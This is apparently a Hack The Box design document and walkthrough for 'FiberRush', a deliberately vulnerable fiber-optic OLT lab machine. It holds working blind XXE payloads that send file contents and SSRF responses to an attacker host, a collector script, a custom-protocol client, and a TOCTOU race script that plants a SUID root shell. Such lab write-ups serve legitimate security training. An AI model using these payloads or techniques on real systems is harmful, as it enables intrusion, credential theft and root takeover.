# FiberRush

## Introduction

FiberRush is an insane-difficulty Linux machine themed around a GPON fiber-optic OLT (Optical Line Terminal) management appliance. It chains together multiple non-trivial attack techniques across very different domains, requiring deep understanding at every stage:

1. **Blind XXE (Out-of-Band) with vendor-specific encoding wrappers** — The provisioning API uses an insecure XML parser, but exfiltration is entirely blind (no error-based or reflection-based leaks). The parser includes a custom `VendorEntityResolver` that supports chainable encoding transforms (`b64:`, `url:`). Players must understand how these wrappers interact with the OOB exfiltration flow and craft multi-stage DTD payloads under a restrictive egress firewall that only allows outbound HTTP to the player's VPN subnet on three specific ports.
2. **SSRF chaining through XXE** — The leaked configuration reveals an internal diagnostic microservice bound exclusively to loopback. Players must chain the XXE into an SSRF to reach this service, decode the double-encoded response (URL + Base64), and extract SSH credentials from the JSON export. The firewall prevents any direct interaction with the internal service from outside.
3. **Custom binary protocol reverse-engineering** — Privilege escalation requires interacting with a proprietary OMCI-like TCP daemon running as root on a loopback port. Players must reverse-engineer the binary wire protocol from source code and raw hex packet captures: understand the packet framing (magic bytes, message types, flags, big-endian fields), implement CRC-16/CCITT-FALSE checksums, and perform a challenge-response authentication flow using MD5-based nonce digests. No off-the-shelf tooling exists for this protocol.
4. **TOCTOU race condition with HMAC-SHA256 bypass** — The daemon's `UPGRADE_ONU` command validates scripts with HMAC-SHA256 using a root-only key before executing them. The signature cannot be forged. However, a 120 ms window between validation and execution allows an atomic file swap (`rename()`) attack. Players must understand TOCTOU semantics, prepare a signed-but-benign decoy and a malicious payload, time the swap precisely, and orchestrate the full attack (protocol client + race script) in concert.

The box tells the story of a realistic telecom fiber-optic management appliance with a vendor-specific binary protocol, restrictive egress firewall rules, internal-only microservices, and cryptographic script validation — mimicking the kind of hardened environment found in real-world critical infrastructure. Every stage requires a distinct skill set (web exploitation, protocol engineering, race condition exploitation), and the lack of standard tooling or straightforward paths makes this a true insane-level challenge.

## Info for HTB

### Access

Passwords:

| User          | Password                                         |
| ------------- | ------------------------------------------------ |
| gpon-operator | *(set via `GPON_OPERATOR_PASSWORD` env variable)* |
| root          | *(set via root password at install time)*         |

### Key Processes

| Process             | User          | Port        | Description                                                                                         |
| ------------------- | ------------- | ----------- | --------------------------------------------------------------------------------------------------- |
| **nginx**           | www-data      | 80 (TCP)    | Reverse-proxies to the Flask web app.                                                               |
| **Flask web app**   | www-data      | 5000 (TCP)  | OLT Management Panel. Hosts the Blind XXE endpoint at `POST /api/v1/onu/provision`. Source: `web/app.py`. |
| **Diagnostic API**  | root          | 9090 (TCP)  | Internal-only Flask service. Exposes `/internal/v1/system/export` which leaks operator credentials. Bound to `127.0.0.1`. Source: `diagnostic_service/diag_api.py`. |
| **omci_daemon**     | root          | 8472 (TCP)  | Custom binary protocol daemon for ONU management. Bound to `127.0.0.1`. Handles HELLO/AUTH/UPGRADE_ONU commands. Source: `omci_daemon/omci_daemon.c`. |
| **sshd**            | root          | 22 (TCP)    | Standard OpenSSH server.                                                                            |

The Flask web app uses `lxml` with an intentionally insecure parser configuration (`load_dtd=True`, `resolve_entities=True`, `no_network=False`) and a custom `VendorEntityResolver` that supports `b64:` and `url:` encoding wrappers for SYSTEM identifiers.

The `omci_daemon` is a custom C binary (source in `omci_daemon/`). It implements a proprietary protocol with CRC-16/CCITT-FALSE integrity checks, challenge-response authentication (MD5-based), and an `UPGRADE_ONU` command that validates scripts via HMAC-SHA256 before execution — but with a TOCTOU vulnerability.

### Automation / Crons

- **Signed upgrade template generation**: During installation (`install.sh`), a 32-byte random HMAC key is generated at `/etc/omci/upgrade.key` (mode `0400`, root-only). A benign upgrade template (`upgrade_ok.body` containing `echo "ok"`) is signed with this key and placed at `/opt/gpon/upgrade_templates/upgrade_ok.sh`. This signed template is readable by `gpon-operator` and is necessary for the TOCTOU exploit — the player copies it to `/tmp` and uses it as the "valid" file for the race.

### Firewall Rules

The machine uses a restrictive `iptables` configuration:

- **Default policies**: INPUT, FORWARD, OUTPUT all set to DROP.
- **Loopback**: Allowed (both directions).
- **Established/Related**: Allowed (both directions).
- **Inbound**: SSH (22/tcp) and HTTP (80/tcp) allowed. Port 9090 explicitly dropped from non-loopback interfaces.
- **Outbound**: HTTP traffic only to `10.10.14.0/24` on ports 80, 443, and 8000. This limits OOB XXE callbacks to the player's HTB VPN IP range only.

### Docker

Docker is not used.

### Other

- The `VendorEntityResolver` in `app.py` is designed to simulate a vendor diagnostic helper that was "accidentally" left enabled. The `b64:` and `url:` transform wrappers make OOB exfiltration trivially reliable (no issues with newlines, special characters, or binary data).
- The OMCI protocol uses a fixed magic value `GONC` (`0x474F4E43`), CRC-16/CCITT-FALSE for integrity, and a challenge-response authentication scheme. Reference packets are provided in `captures/session_packets.hex`.
- The TOCTOU gap is a deterministic 120 ms `nanosleep()` call, making the race condition reliably exploitable without requiring high-speed brute-force attempts.
- The diagnostic API at port 9090 is intentionally unauthenticated and bound to `127.0.0.1`. It serves as the bridge between the XXE/SSRF foothold and the SSH access.



# Writeup

# Enumeration

## Nmap Scan

We start with a full TCP port scan of the target:

```bash
nmap -sC -sV -p- -oN nmap_full.txt fiberrush.htb
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx
```

Two ports are open: SSH (22) and HTTP (80).

## Web Enumeration

Navigating to `http://fiberrush.htb/` in a browser reveals a simple **OLT Management Panel** page with the message "Login is disabled in this demo build. Use the provisioning API."

This hints at an API. Directory/endpoint enumeration (e.g., with `feroxbuster` or `gobuster`) reveals the API path:

```bash
gobuster dir -u http://fiberrush.htb/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

We discover `POST /api/v1/onu/provision`. Testing it with a simple XML body:

```bash
curl -X POST http://fiberrush.htb/api/v1/onu/provision \
  -H "Content-Type: application/xml" \
  -d '<onu-provision><serial-number>TEST001</serial-number><vlan-id>100</vlan-id></onu-provision>'
```

```json
{"status": "queued", "job_id": "a1b2c3d4"}
```

The endpoint accepts XML input and returns a generic response. The response does not reflect any input values back — this is a **blind** endpoint.

# Foothold

## Step 1 — Confirming Blind XXE (OOB)

Since the endpoint parses XML and does not reflect data, we test for **Blind XXE with Out-of-Band (OOB) exfiltration**. First, start a listener on the attacker machine:

```bash
python3 -m http.server 8000
```

Send a probe payload:

```bash
curl -X POST http://fiberrush.htb/api/v1/onu/provision \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % dtd SYSTEM "http://10.10.14.X:8000/test.dtd">
  %dtd;
]>
<onu-provision><serial-number>x</serial-number><vlan-id>100</vlan-id></onu-provision>'
```

If the HTTP server receives a request for `test.dtd`, the XML parser is fetching external DTDs — XXE is confirmed.

## Step 2 — Exfiltrating the OLT Configuration

The XML parser on this box supports special encoding wrappers in SYSTEM identifiers: `b64:` (base64-encodes content) and `url:` (percent-encodes content). These can be chained, e.g., `url:b64:file:///path`. This ensures binary-safe exfiltration through URL query parameters.

Create a DTD file `stage1.dtd` on the attacker machine:

```dtd
<!ENTITY % all "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.X:8000/leak?d=%file;'>">
%all;
%exfil;
```

Set up a collector script (`collector.py`) to decode incoming data:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote_to_bytes
import base64

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        u = urlparse(self.path)
        if u.path == "/leak":
            d = parse_qs(u.query).get("d", [""])[0]
            raw = unquote_to_bytes(d)
            decoded = base64.b64decode(raw)
            print(decoded.decode("utf-8", errors="replace"))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

def main():
    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()

if __name__ == "__main__":
    main()
```

```bash
python3 collector.py
```

Now exfiltrate `/opt/olt/config/olt.conf`:

```bash
curl -X POST http://fiberrush.htb/api/v1/onu/provision \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % file SYSTEM "url:b64:file:///opt/olt/config/olt.conf">
  <!ENTITY % dtd  SYSTEM "http://10.10.14.X:8000/stage1.dtd">
  %dtd;
]>
<onu-provision><serial-number>x</serial-number><vlan-id>100</vlan-id></onu-provision>'
```

The collector decodes and prints the configuration file:

```ini
[omci_daemon]
host=127.0.0.1
port=8472

[diagnostic_api]
host=127.0.0.1
port=9090
endpoint=/internal/v1/system/export

[gpon-operator]
; credentials managed via diagnostic service
; ssh_key_auth=disabled
```

This reveals two internal services:
- **OMCI daemon** at `127.0.0.1:8472`
- **Diagnostic API** at `127.0.0.1:9090` with an export endpoint

## Step 3 — SSRF to Leak SSH Credentials

Using the XXE as an SSRF primitive, we reach the internal diagnostic API to exfiltrate its response.

Create `stage2.dtd`:

```dtd
<!ENTITY % all "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.X:8000/leak?d=%ssrf;'>">
%all;
%exfil;
```

Send the SSRF payload:

```bash
curl -X POST http://fiberrush.htb/api/v1/onu/provision \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % ssrf SYSTEM "url:b64:http://127.0.0.1:9090/internal/v1/system/export">
  <!ENTITY % dtd  SYSTEM "http://10.10.14.X:8000/stage2.dtd">
  %dtd;
]>
<onu-provision><serial-number>x</serial-number><vlan-id>100</vlan-id></onu-provision>'
```

The collector decodes the response:

```json
{
  "hostname": "fiberrush",
  "firmware": "GPON-OS 4.2.1-r7",
  "uptime_seconds": 847293,
  "operators": [
    {
      "username": "gpon-operator",
      "role": "provisioning",
          "ssh_password": "<LEAKED_PASSWORD>",
      "last_login": "2026-02-19T08:41:00Z"
    }
  ],
  "omci_daemon": {"host": "127.0.0.1", "port": 8472, "status": "running"}
}
```

The diagnostic API leaks the `gpon-operator` SSH password.

## Step 4 — SSH Access

```bash
ssh gpon-operator@fiberrush.htb
```

Enter the password obtained from the diagnostic API export. We now have a shell as `gpon-operator` and can read the **user flag**.

```bash
cat ~/user.txt
```

# Privilege Escalation

## Discovering the OMCI Daemon

From the leaked configuration and listening sockets, we know a custom daemon (`omci_daemon`) is running as **root** on `127.0.0.1:8472`. Exploring the filesystem:

```bash
ls -la /opt/gpon/
```

```
drwxr-xr-x src/
drwxr-xr-x tools/
drwxr-xr-x upgrade_templates/
```

Key findings:
- `/opt/gpon/src/` contains the daemon source code (`omci_daemon.c`, `omci_proto.h`, `example_client.c`).
- `/opt/gpon/upgrade_templates/upgrade_ok.sh` is a signed upgrade script (readable but not writable by us).
- `/etc/omci/upgrade.key` is the HMAC signing key (root-only, mode `0400` — we cannot read it).

## Understanding the OMCI Protocol

Reading the source code and protocol documentation reveals a custom TCP binary protocol with:

- **Magic**: `GONC` (`0x474F4E43`)
- **CRC-16/CCITT-FALSE** integrity check over header + payload
- **HELLO** (0x01): Sends username, receives a 16-byte nonce
- **AUTH** (0x02): Sends `MD5(username + ":" + password + ":" + nonce)` for authentication
- **UPGRADE_ONU** (0x05): Sends a NUL-terminated file path; the daemon validates the script's HMAC-SHA256 signature, then executes it as root

## Identifying the TOCTOU Vulnerability

In `omci_daemon.c`, the `handle_upgrade_onu` function:

1. Checks that the file at `path` is owned by the calling user (`stat(path)`)
2. Validates the HMAC-SHA256 signature of the script content (`validate_script_header(path)`)
3. **Sleeps for 120 ms** (`sleep_ms(120)`)
4. Executes the script by path (`system(path)`)

Between step 2 (validation) and step 4 (execution), there is a **120 ms Time-of-Check to Time-of-Use (TOCTOU)** window. If we atomically replace the file at `path` during this window, the daemon will execute our unvalidated payload as root.

## Exploitation

### Prepare the Exploit Files

Copy the legitimate signed template to `/tmp`:

```bash
cp /opt/gpon/upgrade_templates/upgrade_ok.sh /tmp/upgrade.sh
```

Create a malicious payload script (e.g., a reverse shell or adding our SSH key to root):

```bash
cat > /tmp/evil.sh << 'PAYLOAD'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
PAYLOAD
chmod +x /tmp/evil.sh
```

### Write the Race Script

Create a script that performs the atomic swap during the 120 ms TOCTOU window:

```bash
cat > /tmp/race.sh << 'EOF'
#!/bin/bash
set -euo pipefail

LINK="/tmp/upgrade.sh"
GOOD="/opt/gpon/upgrade_templates/upgrade_ok.sh"
EVIL="/tmp/evil.sh"
STAGE_GOOD="/tmp/.stage_good.sh"
STAGE_EVIL="/tmp/.stage_evil.sh"

while true; do
  # Prepare two staged files and atomically swap the path twice:
  # - daemon passes validation on GOOD
  # - daemon executes EVIL after the deterministic sleep window
  cp "$GOOD" "$STAGE_GOOD"
  cp "$EVIL" "$STAGE_EVIL"
  mv -f "$STAGE_GOOD" "$LINK"
  mv -f "$STAGE_EVIL" "$LINK"

  # Check if SUID bash was created
  if [ -f /tmp/rootbash ] && [ -u /tmp/rootbash ]; then
    echo "[+] SUID bash created!"
    exit 0
  fi
done
EOF
chmod +x /tmp/race.sh
```

Note: this race loop runs continuously; it does NOT try to guess the exact timing of validation. Instead, we trigger the vulnerable command many times while the swap loop is running.

### Write the OMCI Protocol Client

We need a client that speaks the custom OMCI protocol. Using the example client from the source as reference, compile it on the target:

```bash
cd /opt/gpon/src
cat example_client.c
```

The example client already implements HELLO + AUTH + UPGRADE_ONU. We can compile and use it directly (the password was leaked earlier from the diagnostic API):

```bash
cd /opt/gpon/src
make
```

Alternatively, if `make` is not available or we prefer Python, write a minimal client:

```python
#!/usr/bin/env python3
import socket, struct, hashlib

MAGIC = 0x474F4E43

def crc16_ccitt_false(data):
    crc = 0xFFFF
    for b in data:
        crc ^= b << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

def build_packet(msg_type, txid, payload):
    hdr = struct.pack('>IBBHH', MAGIC, msg_type, 0x00, txid, len(payload))
    crc = crc16_ccitt_false(hdr + payload)
    return hdr + payload + struct.pack('>H', crc)

def recv_packet(s):
    hdr = s.recv(10)
    _, msg_type, flags, txid, plen = struct.unpack('>IBBHH', hdr)
    payload = s.recv(plen) if plen > 0 else b''
    crc = s.recv(2)
    return msg_type, flags, txid, payload

HOST = '127.0.0.1'
PORT = 8472
USERNAME = b'gpon-operator'
PASSWORD = b'<PASTE_LEAKED_PASSWORD_HERE>'
UPGRADE_PATH = b'/tmp/upgrade.sh\x00'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# HELLO
hello_payload = bytes([len(USERNAME)]) + USERNAME
s.sendall(build_packet(0x01, 1, hello_payload))
_, _, _, resp = recv_packet(s)
nonce = resp[:16]

# AUTH
digest = hashlib.md5(USERNAME + b':' + PASSWORD + b':' + nonce).digest()
auth_payload = bytes([len(USERNAME)]) + USERNAME + digest
s.sendall(build_packet(0x02, 2, auth_payload))
_, _, _, resp = recv_packet(s)
print(f'AUTH response: {resp}')

# UPGRADE_ONU (trigger many times to catch the race window)
for i in range(2000):
    s.sendall(build_packet(0x05, 3 + i, UPGRADE_PATH))
    _, _, _, resp = recv_packet(s)
    if b"scheduled" in resp.lower():
        pass
s.close()
```

Save this as `/tmp/omci_client.py`.

### Execute the Race

Run the race script in the background, then trigger the UPGRADE command:

```bash
# Terminal 1: Start the race (atomic swap loop)
cd /tmp
bash /tmp/race.sh &

# Terminal 2: Trigger the UPGRADE_ONU command
python3 /tmp/omci_client.py
```

The timing works as follows:
1. The race script places the legitimate `upgrade_ok.sh` at `/tmp/upgrade.sh`.
2. The OMCI client sends UPGRADE_ONU pointing to `/tmp/upgrade.sh`.
3. The daemon validates the signed script (passes HMAC check).
4. During the 120 ms sleep, the race loop will eventually have swapped the path to the evil script.
5. The daemon executes the now-replaced file as root.

After a successful race (may take a few attempts):

```bash
ls -la /tmp/rootbash
```

```
-rwsr-sr-x 1 root root 1396520 ... /tmp/rootbash
```

### Get Root

```bash
/tmp/rootbash -p
whoami
```

```
root
```

Read the root flag:

```bash
cat /root/root.txt
```
